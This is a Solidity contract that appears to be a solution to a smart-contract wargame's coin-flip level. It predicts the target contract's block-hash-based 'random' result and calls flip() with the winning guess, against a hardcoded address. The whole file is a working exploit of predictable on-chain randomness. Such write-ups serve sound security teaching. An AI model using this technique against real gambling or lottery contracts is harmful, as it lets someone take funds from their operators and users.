// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/ICoinFlip.sol";

contract BeatCoinFlip {
    ICoinFlip public coinFlipContract;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        coinFlipContract = ICoinFlip(
            0xA3E705dDfa62f3dEc67c68c6A80d5C6Dce933301
        );
    }

    function beatFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
